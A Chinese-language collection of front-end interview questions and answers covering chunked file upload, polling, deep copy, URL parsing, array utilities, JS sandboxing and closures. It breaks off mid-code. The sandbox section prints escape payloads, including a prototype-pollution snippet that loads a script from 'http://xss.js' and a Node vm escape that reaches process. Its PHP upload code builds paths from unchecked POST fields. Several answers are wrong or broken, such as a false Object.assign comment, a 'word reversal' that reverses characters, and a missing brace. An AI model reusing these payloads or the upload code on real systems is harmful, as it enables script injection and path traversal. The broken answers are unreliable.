如果需要让用户体验异步上传文件的感觉，可以通过framename指定iframe来实现。把form的target属性设置为一个看不见的iframe，那么返回的数据就会被这个iframe接受，因此只有该iframe会被刷新，至于返回结果，也可以通过解析这个iframe内的文本来获取。 function upload()&#123; var now = +new Date() var id = 'frame' + now $(\"body\").append(`&lt;iframe style=\"display:none;\" name=\"$&#123;id&#125;\" id=\"$&#123;id&#125;\" />`); var $form = $(\"#myForm\") $form.attr(&#123; \"action\": '/index.php', \"method\": \"post\", \"enctype\": \"multipart/form-data\", \"encoding\": \"multipart/form-data\", \"target\": id &#125;).submit() $(\"#\"+id).on(\"load\", function()&#123; var content = $(this).contents().find(\"body\").text() try&#123; var data = JSON.parse(content) &#125;catch(e)&#123; console.log(e) &#125; &#125;) &#125; 扩展： 大文件上传 现在来看看在上面提到的几种上传方式中实现大文件上传会遇见的超时问题， 表单上传和iframe无刷新页面上传，实际上都是通过form标签进行上传文件，这种方式将整个请求完全交给浏览器处理，当上传大文件时，可能会遇见请求超时的情形 通过fromData，其实际也是在xhr中封装一组请求参数，用来模拟表单请求，无法避免大文件上传超时的问题 编码上传，我们可以比较灵活地控制上传的内容 大文件上传最主要的问题就在于：在同一个请求中，要上传大量的数据，导致整个过程会比较漫长，且失败后需要重头开始上传。试想，如果我们将这个请求拆分成多个请求，每个请求的时间就会缩短，且如果某个请求失败，只需要重新发送这一次请求即可，无需从头开始，这样是否可以解决大文件上传的问题呢？ 综合上面的问题，看来大文件上传需要实现下面几个需求 支持拆分上传请求(即切片) 支持断点续传 支持显示上传进度和暂停上传 接下来让我们依次实现这些功能，看起来最主要的功能应该就是切片了。 文件切片 编码方式上传中，在前端我们只要先获取文件的二进制内容，然后对其内容进行拆分，最后将每个切片上传到服务端即可。 在JavaScript中，文件FIle对象是Blob对象的子类，Blob对象包含一个重要的方法slice，通过这个方法，我们就可以对二进制文件进行拆分。 下面是一个拆分文件的示例 function slice(file, piece = 1024 * 1024 * 5) &#123; let totalSize = file.size; // 文件总大小 let start = 0; // 每次上传的开始字节 let end = start + piece; // 每次上传的结尾字节 let chunks = [] while (start &lt; totalSize) &#123; // 根据长度截取每次需要上传的数据 // File对象继承自Blob对象，因此包含slice方法 let blob = file.slice(start, end); chunks.push(blob) start = end; end = start + piece; &#125; return chunks &#125; 将文件拆分成piece大小的分块，然后每次请求只需要上传这一个部分的分块即可 let file = document.querySelector(\"[name=file]\").files[0]; const LENGTH = 1024 * 1024 * 0.1; let chunks = slice(file, LENGTH); // 首先拆分切片 chunks.forEach(chunk=>&#123; let fd = new FormData(); fd.append(\"file\", chunk); post('/mkblk.php', fd) &#125;) 服务器接收到这些切片后，再将他们拼接起来就可以了，下面是PHP拼接切片的示例代码 $filename = './upload/' . $_POST['filename'];//确定上传的文件名 //第一次上传时没有文件，就创建文件，此后上传只需要把数据追加到此文件中 if(!file_exists($filename))&#123; move_uploaded_file($_FILES['file']['tmp_name'],$filename); &#125;else&#123; file_put_contents($filename,file_get_contents($_FILES['file']['tmp_name']),FILE_APPEND); echo $filename; &#125; 测试时记得修改nginx的server配置，否则大文件可能会提示413 Request Entity Too Large的错误。 server &#123; // ... client_max_body_size 50m; &#125; 上面这种方式来存在一些问题 无法识别一个切片是属于哪一个切片的，当同时发生多个请求时，追加的文件内容会出错 切片上传接口是异步的，无法保证服务器接收到的切片是按照请求顺序拼接的 因此接下来我们来看看应该如何在服务端还原切片。 还原切片 在后端需要将多个相同文件的切片还原成一个文件，上面这种处理切片的做法存在下面几个问题 如何识别多个切片是来自于同一个文件的，这个可以在每个切片请求上传递一个相同文件的context参数 如何将多个切片还原成一个文件 确认所有切片都已上传，这个可以通过客户端在切片全部上传后调用mkfile接口来通知服务端进行拼接 找到同一个context下的所有切片，确认每个切片的顺序，这个可以在每个切片上标记一个位置索引值 按顺序拼接切片，还原成文件 上面有一个重要的参数，即context，我们需要获取为一个文件的唯一标识，可以通过下面两种方式获取 根据文件名、文件长度等基本信息进行拼接，为了避免多个用户上传相同的文件，可以再额外拼接用户信息如uid等保证唯一性 根据文件的二进制内容计算文件的hash，这样只要文件内容不一样，则标识也会不一样，缺点在于计算量比较大. 修改上传代码，增加相关参数 // 获取context，同一个文件会返回相同的值 function createContext(file) &#123; return file.name + file.length &#125; let file = document.querySelector(\"[name=file]\").files[0]; const LENGTH = 1024 * 1024 * 0.1; let chunks = slice(file, LENGTH); // 获取对于同一个文件，获取其的context let context = createContext(file); let tasks = []; chunks.forEach((chunk, index) => &#123; let fd = new FormData(); fd.append(\"file\", chunk); // 传递context fd.append(\"context\", context); // 传递切片索引值 fd.append(\"chunk\", index + 1); tasks.push(post(\"/mkblk.php\", fd)); &#125;); // 所有切片上传完毕后，调用mkfile接口 Promise.all(tasks).then(res => &#123; let fd = new FormData(); fd.append(\"context\", context); fd.append(\"chunks\", chunks.length); post(\"/mkfile.php\", fd).then(res => &#123; console.log(res); &#125;); &#125;); 在mkblk.php接口中，我们通过context来保存同一个文件相关的切片 // mkblk.php $context = $_POST['context']; $path = './upload/' . $context; if(!is_dir($path))&#123; mkdir($path); &#125; // 把同一个文件的切片放在相同的目录下 $filename = $path .'/'. $_POST['chunk']; $res = move_uploaded_file($_FILES['file']['tmp_name'],$filename); 除了上面这种简单通过目录区分切片的方法之外，还可以将切片信息保存在数据库来进行索引。接下来是mkfile.php接口的实现，这个接口会在所有切片上传后调用 // mkfile.php $context = $_POST['context']; $chunks = (int)$_POST['chunks']; //合并后的文件名 $filename = './upload/' . $context . '/file.jpg'; for($i = 1; $i &lt;= $chunks; ++$i)&#123; $file = './upload/'.$context. '/' .$i; // 读取单个切块 $content = file_get_contents($file); if(!file_exists($filename))&#123; $fd = fopen($filename, \"w+\"); &#125;else&#123; $fd = fopen($filename, \"a\"); &#125; fwrite($fd, $content); // 将切块合并到一个文件上 &#125; echo $filename; 这样就解决了上面的两个问题： 识别切片来源 保证切片拼接顺序 断点续传 即使将大文件拆分成切片上传，我们仍需等待所有切片上传完毕，在等待过程中，可能发生一系列导致部分切片上传失败的情形，如网络故障、页面关闭等。由于切片未全部上传，因此无法通知服务端合成文件。这种情况下可以通过断点续传来进行处理。 断点续传指的是：可以从已经上传部分开始继续上传未完成的部分，而没有必要从头开始上传，节省上传时间。 由于整个上传过程是按切片维度进行的，且mkfile接口是在所有切片上传完成后由客户端主动调用的，因此断点续传的实现也十分简单： 在切片上传成功后，保存已上传的切片信息 当下次传输相同文件时，遍历切片列表，只选择未上传的切片进行上传 所有切片上传完毕后，再调用mkfile接口通知服务端进行文件合并 因此问题就落在了如何保存已上传切片的信息了，保存一般有两种策略 可以通过locaStorage等方式保存在前端浏览器中，这种方式不依赖于服务端，实现起来也比较方便，缺点在于如果用户清除了本地文件，会导致上传记录丢失 服务端本身知道哪些切片已经上传，因此可以由服务端额外提供一个根据文件context查询已上传切片的接口，在上传文件前调用该文件的历史上传记录 下面让我们通过在本地保存已上传切片记录，来实现断点上传的功能 // 获取已上传切片记录 function getUploadSliceRecord(context)&#123; let record = localStorage.getItem(context) if(!record)&#123; return [] &#125;else &#123; try&#123; return JSON.parse(record) &#125;catch(e)&#123;&#125; &#125; &#125; // 保存已上传切片 function saveUploadSliceRecord(context, sliceIndex)&#123; let list = getUploadSliceRecord(context) list.push(sliceIndex) localStorage.setItem(context, JSON.stringify(list)) &#125; 然后对上传逻辑稍作修改，主要是增加上传前检测是已经上传、上传后保存记录的逻辑 let context = createContext(file); // 获取上传记录 let record = getUploadSliceRecord(context); let tasks = []; chunks.forEach((chunk, index) => &#123; // 已上传的切片则不再重新上传 if(record.includes(index))&#123; return &#125; let fd = new FormData(); fd.append(\"file\", chunk); fd.append(\"context\", context); fd.append(\"chunk\", index + 1); let task = post(\"/mkblk.php\", fd).then(res=>&#123; // 上传成功后保存已上传切片记录 saveUploadSliceRecord(context, index) record.push(index) &#125;) tasks.push(task); &#125;); 此时上传时刷新页面或者关闭浏览器，再次上传相同文件时，之前已经上传成功的切片就不会再重新上传了。 服务端实现断点续传的逻辑基本相似，只要在getUploadSliceRecord内部调用服务端的查询接口获取已上传切片的记录即可，因此这里不再展开。 此外断点续传还需要考虑切片过期的情况：如果调用了mkfile接口，则磁盘上的切片内容就可以清除掉了，如果客户端一直不调用mkfile的接口，放任这些切片一直保存在磁盘显然是不可靠的，一般情况下，切片上传都有一段时间的有效期，超过该有效期，就会被清除掉。基于上述原因，断点续传也必须同步切片过期的实现逻辑。 上传进度和暂停 通过xhr.upload中的progress方法可以实现监控每一个切片上传进度。 上传暂停的实现也比较简单，通过xhr.abort可以取消当前未完成上传切片的上传，实现上传暂停的效果，恢复上传就跟断点续传类似，先获取已上传的切片列表，然后重新发送未上传的切片。 由于篇幅关系，上传进度和暂停的功能这里就先不实现了。 45、使用setInterval请求实时数据，返回顺序不一致怎么解决参考答案： 场景： setInterval(function() &#123; $.get(\"/path/to/server\", function(data, status) &#123; console.log(data); &#125;); &#125;, 10000); 上面的程序会每隔10秒向服务器请求一次数据，并在数据到达后存储。这个实现方法通常可以满足简单的需求，然而同时也存在着很大的缺陷：在网络情况不稳定的情况下，服务器从接收请求、发送请求到客户端接收请求的总时间有可能超过10秒，而请求是以10秒间隔发送的，这样会导致接收的数据到达先后顺序与发送顺序不一致。 解决方案： 使用setTimeout代替setInterval 程序首先设置10秒后发起请求，当数据返回后再隔10秒发起第二次请求，以此类推。这样的话虽然无法保证两次请求之间的时间间隔为固定值，但是可以保证到达数据的顺序。 function poll() &#123; setTimeout(function() &#123; $.get(\"/path/to/server\", function(data, status) &#123; console.log(data); // 发起下一次请求 poll(); &#125;); &#125;, 10000); &#125; WebSocket WebSocket 协议本质上是一个基于 TCP 的协议。 为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息”Upgrade: WebSocket”表明这是一个申请协议升级的 HTTP 请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。 服务器（Node.js）： var WebSocketServer = require('ws').Server; var wss = new WebSocketServer(&#123;port: 8080&#125;); wss.on(\"connection\", function(socket) &#123; socket.on(\"message\", function(msg) &#123; console.log(msg); socket.send(\"Nice to meet you!\"); &#125;); &#125;); 客户端同样可以使用Node.js或者是浏览器实现，这里选用浏览器作为客户端： // WebSocket 为客户端JavaScript的原生对象 var ws = new WebSocket(\"ws://localhost:8080\"); ws.onopen = function (event) &#123; ws.send(\"Hello there!\"); &#125; ws.onmessage = function (event) &#123; console.log(event.data); &#125; 46、浅拷贝，深拷贝(实现方式)参考答案： 浅拷贝和深拷贝都只针对于引用数据类型，浅拷贝只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存；但深拷贝会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象； 区别：浅拷贝只复制对象的第一层属性、深拷贝可以对对象的属性进行递归复制； 实现浅拷贝方法 （1）Object.assign方法 var obj = &#123; a: 1, b: 2 &#125; var obj1 = Object.assign(&#123;&#125;,obj); boj1.a = 3; console.log(obj.a) // 3 （2）for in方法 // 只复制第一层的浅拷贝 function simpleCopy(obj1) &#123; var obj2 = Array.isArray(obj1) ? [] : &#123;&#125;; for (let i in obj1) &#123; obj2[i] = obj1[i]; &#125; return obj2; &#125; var obj1 = &#123; a: 1, b: 2, c: &#123; d: 3 &#125; &#125; var obj2 = simpleCopy(obj1); obj2.a = 3; obj2.c.d = 4; alert(obj1.a); // 1 alert(obj2.a); // 3 alert(obj1.c.d); // 4 alert(obj2.c.d); // 4 实现深拷贝方法 （1）采用递归去拷贝所有层级属性 function deepClone(obj)&#123; let objClone = Array.isArray(obj)?[]:&#123;&#125;; if(obj &amp;&amp; typeof obj===\"object\")&#123; for(key in obj)&#123; if(obj.hasOwnProperty(key))&#123; //判断ojb子元素是否为对象，如果是，递归复制 if(obj[key]&amp;&amp;typeof obj[key] ===\"object\")&#123; objClone[key] = deepClone(obj[key]); &#125;else&#123; //如果不是，简单复制 objClone[key] = obj[key]; &#125; &#125; &#125; &#125; return objClone; &#125; let a=[1,2,3,4], b=deepClone(a); a[0]=2; console.log(a,b); （2）使用JSON.stringify和JSON.parse实现深拷贝：JSON.stringify把对象转成字符串，再用JSON.parse把字符串转成新的对象； function deepCopy(obj1)&#123; let _obj = JSON.stringify(obj1); let obj2 = JSON.parse(_obj); return obj2; &#125; var a = [1, [1, 2], 3, 4]; var b = deepCopy(a); b[1][0] = 2; alert(a); // 1,1,2,3,4 alert(b); // 2,2,2,3,4 （3）热门的函数库lodash，也有提供_.cloneDeep用来做深拷贝； var _ = require('lodash'); var obj1 = &#123; a: 1, b: &#123; f: &#123; g: 1 &#125; &#125;, c: [1, 2, 3] &#125;; var obj2 = _.cloneDeep(obj1); console.log(obj1.b.f === obj2.b.f); // false 47、获取当前页面url参考答案： window.location.href (设置或获取整个 URL 为字符串) var test = window.location.href; alert(test); // 返回：http://i.cnblogs.com/EditPosts.aspx?opt=1 window.location.protocol (设置或获取 URL 的协议部分) var test = window.location.protocol; alert(test); //返回：http: window.location.host (设置或获取 URL 的主机部分) var test = window.location.host; alert(test); //返回：i.cnblogs.com window.location.port (设置或获取与 URL 关联的端口号码) var test = window.location.port; alert(test); //返回：空字符(如果采用默认的80端口 (update:即使添加了:80)，那么返回值并不是默认的80而是空字符) window.location.pathname (设置或获取与 URL 的路径部分（就是文件地址）) var test = window.location.pathname; alert(test); //返回：/EditPosts.aspx window.location.search (设置或获取 href 属性中跟在问号后面的部分) var test = window.location.search; alert(test); //返回：?opt=1 （PS：获得查询（参数）部分，除了给动态语言赋值以外，我们同样可以给静态页面，并使用javascript来获得相信应的参数值。） window.location.hash (设置或获取 href 属性中在井号“#”后面的分段) var test = window.location.hash; alert(test); //返回：空字符(因为url中没有) js获取url中的参数值* 正则法 function getQueryString(name) &#123; var reg = new RegExp('(^|&amp;)' + name + '=([^&amp;]*)(&amp;|$)', 'i'); var r = window.location.search.substr(1).match(reg); if (r != null) &#123; return unescape(r[2]); &#125; return null; &#125; // 这样调用： alert(GetQueryString(\"参数名1\")); alert(GetQueryString(\"参数名2\")); alert(GetQueryString(\"参数名3\")); split拆分法 function GetRequest() &#123; var url = location.search; //获取url中\"?\"符后的字串 var theRequest = new Object(); if (url.indexOf(\"?\") != -1) &#123; var str = url.substr(1); strs = str.split(\"&amp;\"); for(var i = 0; i &lt; strs.length; i ++) &#123; theRequest[strs[i].split(\"=\")[0]] = unescape(strs[i].split(\"=\")[1]); &#125; &#125; return theRequest; &#125; var Request = new Object(); Request = GetRequest();&lt;br>// var id=Request[\"id\"]; // var 参数1,参数2,参数3,参数N; // 参数1 = Request['参数1']; // 参数2 = Request['参数2']; // 参数3 = Request['参数3']; // 参数N = Request['参数N']; 指定取比如说一个url：http://i.cnblogs.com/?j=js, 我们想得到参数j的值，可以通过以下函数调用。 function GetQueryString(name) &#123; var reg = new RegExp(\"(^|&amp;)\" + name + \"=([^&amp;]*)(&amp;|$)\", \"i\"); var r = window.location.search.substr(1).match(reg); //获取url中\"?\"符后的字符串并正则匹配 var context = \"\"; if (r != null) context = r[2]; reg = null; r = null; return context == null || context == \"\" || context == \"undefined\" ? \"\" : context; &#125; alert(GetQueryString(\"j\")); 单个参数的获取方法 function GetRequest() &#123; var url = location.search; //获取url中\"?\"符后的字串 if (url.indexOf(\"?\") != -1) &#123;? //判断是否有参数 var str = url.substr(1); //从第一个字符开始 因为第0个是?号 获取所有除问号的所有符串 strs = str.split(\"=\");? //用等号进行分隔 （因为知道只有一个参数 //所以直接用等号进分隔 如果有多个参数 要用&amp;号分隔 再用等号进行分隔） alert(strs[1]);???? //直接弹出第一个参数 （如果有多个参数 还要进行循环的） &#125; &#125; 48、js中两个数组怎么取交集+(差集、并集、补集)ES5：交集： let arr1 = [1, 2, 3, 4, 5, 6]; let arr2 = [3, 4, 5, 6, 7, 8, 9]; function getIntersection(arr1, arr2) &#123; let newArr = arr1.filter((item) => &#123; console.log(arr2.indexOf(item)); return arr2.indexOf(item) > -1 &#125;); return newArr; &#125; // console.log(getIntersection(arr1, arr2)); 并集： function getSet(arr1, arr2) &#123; let newArr = arr2.filter((item) => &#123; return arr1.indexOf(item) == -1; &#125;); return arr1.concat(newArr); &#125; console.log(getSet(arr1, arr2)); 补集： function getComplement(arr1, arr2) &#123; let newArr1 = arr1.filter((item) => &#123; return arr2.indexOf(item) == -1; &#125;); let newArr2 = arr2.filter((item) => &#123; return arr1.indexOf(item) == -1; &#125;); return newArr1.concat(newArr2); &#125; ES6：交集： let arr1 = [1, 2, 3, 4, 5, 6]; let arr2 = [3, 4, 5, 6, 7, 8, 9]; function getIntersection(arr1, arr2) &#123; let y = new Set(arr2); return arr1.filter((x) => y.has(x)); &#125; console.log(getIntersection(arr1, arr2)); 并集： let arr1 = [1, 2, 3, 4, 5, 6]; let arr2 = [3, 4, 5, 6, 7, 8, 9]; function getSet(arr1, arr2) &#123; let x = arr1.concat(arr2); return [...new Set(x)]; &#125; console.log(getSet(arr1, arr2)); 49、沙箱隔离怎么做的什么原理参考答案： 沙箱，即sandbox，顾名思义，就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，通过创建类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。 实现沙箱的三种方法 借助with + new Function 首先从最简陋的方法说起，假如你想要通过eval和function直接执行一段代码，这是不现实的，因为代码内部可以沿着作用域链往上找，篡改全局变量，这是我们不希望的，所以你需要让沙箱内的变量访问都在你的监控范围内；不过，你可以使用with API，在with的块级作用域下，变量访问会优先查找你传入的参数对象，之后再往上找，所以相当于你变相监控到了代码中的“变量访问”： function compileCode (src) &#123; src = 'with (exposeObj) &#123;' + src + '&#125;' return new Function('exposeObj', src) &#125; 接下里你要做的是，就是暴露可以被访问的变量exposeObj，以及阻断沙箱内的对外访问。通过es6提供的proxy特性，可以获取到对对象上的所有改写： function compileCode (src) &#123; src = `with (exposeObj) &#123; $&#123;src&#125; &#125;` return new Function('exposeObj', src) &#125; function proxyObj(originObj)&#123; let exposeObj = new Proxy(originObj,&#123; has:(target,key)=>&#123; if([\"console\",\"Math\",\"Date\"].indexOf(key)>=0)&#123; return target[key] &#125; if(!target.hasOwnProperty(key))&#123; throw new Error(`Illegal operation for key $&#123;key&#125;`) &#125; return target[key] &#125;, &#125;) return exposeObj &#125; function createSandbox(src,obj)&#123; let proxy = proxyObj(obj) compileCode(src).call(proxy,proxy) //绑定this 防止this访问window &#125; 通过设置has函数，可以监听到变量的访问，在上述代码中，仅暴露个别外部变量供代码访问，其余不存在的属性，都会直接抛出error。其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了。接下来我们测试一下： const testObj = &#123; value:1, a:&#123; b: &#125; &#125; createSandbox(\"value='haha';console.log(a)\",testObj) 看起来一切似乎没有什么问题，但是问题出在了传入的对象，当调用的是console.log(a.b)的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，这时候，它只需要通过a.b.proto就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。 createSandbox(` a.b.__proto__.toString = ()=>&#123; new (()=>&#123;&#125;).constructor(\"var script = document.createElement('script'); script.src = 'http://xss.js'; script.type = 'text/javascript'; document.body.appendChild(script);\")() &#125; `,testObj) console.log(testObj.a.b.__proto__.toString()) 例如上面所展示的代码，通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码；由于在内部定义执行的函数代码逻辑，仍然会沿着作用于链查找，为了绕开作用域链的查找，笔者通过访问箭头函数的constructor的方式拿到了构造函数Function，这个时候，Funtion内所执行的xss代码，在执行的时候，便不会再沿着作用域链往上找，而是直接在全局作用域下执行，通过这样的方式，实现了沙箱逃逸以及xss攻击。 你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null)的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，但是，即使是基本类型值，数字或字符串，同样也可以通过proto查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过： (&#123;&#125;).__proto__.toString= ()=>&#123;console.log(111)&#125;; 可见，new Function + with的这种沙箱方式，防君子不防小人，当然，你也可以通过对传入的code代码做代码分析或过滤？假如传入的代码不是按照的规定的数据格式（例如json），就直接抛出错误，阻止恶意代码注入，但这始终不是一种安全的做法。 借助iframe实现沙箱 前面介绍一种劣质的、不怎么安全的方法构造了一个简单的沙箱，但是在前端最常见的方法，还是利用iframe来构造一个沙箱 &lt;iframe sandbox src=\"...\">&lt;/iframe> 但是这也会带来一些限制： script脚本不能执行 不能发送ajax请求 不能使用本地存储，即localStorage,cookie等 不能创建新的弹窗和window 不能发送表单 不能加载额外插件比如flash等 不过别方，你可以对这个iframe标签进行一些配置： 接下里你只需要结合postMessage API，将你需要执行的代码，和需要暴露的数据传递过去，然后和你的iframe页面通信就行了。 1）需要注意的是，在子页面中，要注意不要让执行代码访问到contentWindow对象，因为你需要调用contentWindow的postMessageAPI给父页面传递信息，假如恶意代码也获取到了contentWindow对象，相当于就拿到了父页面的控制权了，这个时候可大事不妙。 2）当使用postMessageAPI的时候，由于sandbox的origin默认为null，需要设置allow-same-origin允许两个页面进行通信，意味着子页面内可以发起请求，这时候需要防范好CSRF，允许了同域请求，不过好在，并没有携带上cookie。 3）当调用postMessageAPI传递数据给子页面的时候，传输的数据对象本身已经通过结构化克隆算法复制 简单的说，通过postMessageAPI传递的对象，已经由浏览器处理过了，原型链已经被切断，同时，传过去的对象也是复制好了的，占用的是不同的内存空间，两者互不影响，所以你不需要担心出现第一种沙箱做法中出现的问题。 nodejs中的沙箱 nodejs中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。 const vm = require('vm'); const x = 1; const sandbox = &#123; x: 2 &#125;; vm.createContext(sandbox); // Contextify the sandbox. const code = 'x += 40; var y = 17;'; vm.runInContext(code, sandbox); console.log(sandbox.x); // 42 console.log(sandbox.y); // 17 console.log(x); // 1; y is not defined. vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。 但是vm是绝对安全的吗？不一定。 const vm = require('vm'); vm.runInNewContext(\"this.constructor.constructor('return process')().exit()\") 通过上面这段代码，我们可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行，这是我们不希望的，解决方案是绑定好context上下文对象，同时，为了避免通过原型链逃逸（nodejs中的对象并没有像浏览器端一样进行结构化复制，导致原型链依然保留），所以我们需要切断原型链，同时对于传入的暴露对象，只提供基本类型值。 let ctx = Object.create(null); ctx.a = 1; // ctx上不能包含引用类型的属性 vm.runInNewContext(\"this.constructor.constructor('return process')().exit()\", ctx); 让我们来看一下TSW中是怎么使用的： const vm = require('vm'); const SbFunction = vm.runInNewContext('(Function)', Object.create(null)); // 沙堆 ... if (opt.jsonpCallback) &#123; code = `var result=null; var $&#123;opt.jsonpCallback&#125;=function($1)&#123;result=$1&#125;; $&#123;responseText&#125;; return result;`; obj = new SbFunction(code)(); &#125; ... 通过runInNewContext返回沙箱中的构造函数Function，同时传入切断原型链的空对象防止逃逸，之后再外部使用的时候，只需要调用返回的这个函数，和普通的new Function一样调用即可。 53、闭包的理解参考答案： 闭包： 一个函数和对其周围状态（lexical environment，词法环境）的引用捆绑在一起（或者说函数被引用包围）， 这样的组合就是闭包（closure）。也就是说，闭包让你可以在一个内层函数中访问到其外层函数的作用域。在 JavaScript 中，每当创建一个函数，闭包就会在函数创建的同时被创建出来。 闭包的特点： 让外部访问函数内部变量成为可能；​ 可以避免使用全局变量，防止全局变量污染；​ 可以让局部变量常驻在内存中；​ 会造成内存泄漏（有一块内存空间被长期占用，而不被释放） 应用场景 埋点（是网站分析的一种常用的数据采集方法）计数器 function count() &#123; var num = 0; return function () &#123; return ++num &#125; &#125; var getNum = count(); var getNewNum = count(); document.querySelectorAll('button')[0].onclick = function()&#123; console.log('点击加入购物车次数： '+getNum()); &#125; document.querySelectorAll('button')[1].onclick = function()&#123; console.log('点击付款次数： '+getNewNum()); &#125; 事件+循环 按照以下方式添加事件，打印出来的i不是按照序号的 形成原因就是操作的是同一个词法环境,因为onclick后面的函数都是一个闭包，但是操作的是同一个词法环境 var lis = document.querySelectorAll('li'); for (var i = 0; i &lt; lis.length; i++) &#123; lis[i].onclick = function () &#123; alert(i) &#125; &#125; 解决办法： 使用匿名函数之后，就形成一个闭包， 操作的就是不同的词法环境 var lis = document.querySelectorAll('li'); for (var i = 0; i &lt; lis.length; i++) &#123; (function (j) &#123; lis[j].onclick = function () &#123; alert(j) &#125; &#125;)(i) &#125; JS应用篇字符串中的单词逆序输出（手写）let str = \"Hello My name is kif and i am from XTU\"; function reChange1(str) &#123; return str.split(\"\").reverse().join(\"\"); &#125; console.log(reChange1(str)); let str = \"Hello My name is kif and i am from XTU\"; function reChange2(str) &#123; let newSTr = \"\"; for (let i = str.length - 1; i >= 0; i--) &#123; newSTr += str.charAt(i); &#125; return newSTr console.log(reChange2(str)); function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组参考答案： 把考点拆成了4个小项；需要用递归算法实现：a) 生成一个长度为n的空数组arr。b) 生成一个（min－max）之间的随机整数rand。c) 把随机数rand插入到数组arr内，如果数组arr内已存在与rand相同的数字，则重新生成随机数rand并插入到 arr内[需要使用递归实现，不能使用for&#x2F;while等循环]d) 最终输出一个长度为n，且内容不重复的数组arr。 Math.random//产生一个[0，1)之间的随机数。 Math.random()： //返回指定范围的随机数(m-n之间)的公式: Math.random()*(n-m)+m； 或者 Math.random()*(n+1-m)+m function buildArray(arr, n, min, max) &#123; var num = Math.floor(Math.random() * (max - min + 1)) + min; if (!arr.includes(num)) &#123; arr.push(num); &#125; return arr.length === n ? arr : buildArray(arr, n, min, max); &#125; var result = buildArray([], 5, 2, 32); console.table(result); function rand(min, max, N) &#123; let arr = []; let l = 0; console.log(N); for (; l &lt; N; ) &#123; // console.log(l); let r = Math.floor(Math.random() * (max - min)) + min; if (!arr.includes(r)) &#123; console.log(r); arr.push(r); l++; &#125; &#125; return arr; &#125; console.log(rand(2, 61, 5)); 实现一个数组对象的去重，相同value的只保留最后一个，最好有多个思路参考答案： 1.遍历数组法 它是最简单的数组去重方法（indexOf方法） 实现思路：新建一个数组，遍历去要重的数组，当值不在新数组的时候（indexOf为-1）就加入该新数组中； var arr=[2,8,5,0,5,2,6,7,2]; function unique1(arr)&#123; var hash=[]; for (var i = 0; i &lt; arr.length; i++) &#123; if(hash.indexOf(arr[i])==-1)&#123; hash.push(arr[i]); &#125; &#125; return hash; &#125; 2.数组下标判断法 调用indexOf方法，性能和方法1差不多 实现思路：如果当前数组的第 i 项在当前数组中第一次出现的位置不是 i，那么表示第 i 项是重复的，忽略掉。否则存入结果数组。 function unique2(arr)&#123; var hash=[]; for (var i = 0; i &lt; arr.length; i++) &#123; if(arr.indexOf(arr[i])==i)&#123; hash.push(arr[i]); &#125; &#125; return hash; &#125; 3.排序后相邻去除法 实现思路：给传入的数组排序，排序后相同的值会相邻，然后遍历排序后数组时，新数组只加入不与前一值重复的值。 function unique3(arr)&#123; arr.sort(); var hash=[arr[0]]; for (var i = 1; i &lt; arr.length; i++) &#123; if(arr[i]!=hash[hash.length-1])&#123; hash.push(arr[i]); &#125; &#125; return hash; &#125; 4.优化遍历数组法（推荐） 实现思路：双层循环，外循环表示从0到arr.length，内循环表示从i+1到arr.length 将没重复的右边值放入新数组。（检测到有重复值时终止当前循环同时进入外层循环的下一轮判断） function unique4(arr)&#123; var hash=[]; for (var i = 0; i &lt; arr.length; i++) &#123; for (var j = i+1; j &lt; arr.length; j++) &#123; if(arr[i]===arr[j])&#123; ++i; break; &#125; &#125; hash.push(arr[i]); &#125; return hash; &#125; 5.ES6实现 基本思路：ES6提供了新的数据结构Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。 Set函数可以接受一个数组（或类似数组的对象）作为参数，用来初始化。 function unique5(arr)&#123; var x = new Set(arr); return [...x]; &#125; 扩展：如果重复，则去掉该元素 数组下标去重 function unique22(arr)&#123; var hash=[]; for (var i = 0; i &lt; arr.length; i++) &#123; if(arr.indexOf(arr[i])==arr.lastIndexOf(arr[i]))&#123; hash.push(arr[i]); &#125; &#125; return hash; &#125; 传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]let a = [1, [[2], '3', 4], 5]; function change(arr) &#123; let x = arr.toString(); let list = x.split(\",\"); let ans = list.map((i) => &#123; // console.log(i) return typeof i === 'string' ? Number(i) : i; &#125;); // console.log(ans) return ans; &#125; console.log(change(a)); ​ ES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中： var arr = [1, [2, [3, 4]]]; console.log([].concat(...arr)); // [1, 2, [3, 4]] 我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法： // 方法4 var arr = [1, [2, [3, 4]]]; function flatten(arr) &#123; while (arr.some(item => Array.isArray(item))) &#123; arr = [].concat(...arr); &#125; return arr; &#125; console.log(flatten(arr)) 用正则和非正则实现12345678.12&#x3D;》12，345，678.12let num = 12345678.12 //12,345,678.12 function change(number) &#123; let s = number.toString() //console.log(s) let L = s.split('.') let num_s L.length == 2 ? num_s = L[1] : num_s = -1 let N=L[0] let num_f let y =N.length % 3 num_f = N.slice(0, y) for (let i = y; i &lt; N.length; i += 3) &#123; num_f += ',' + N.slice(i,i+3) &#125; if (num_s != 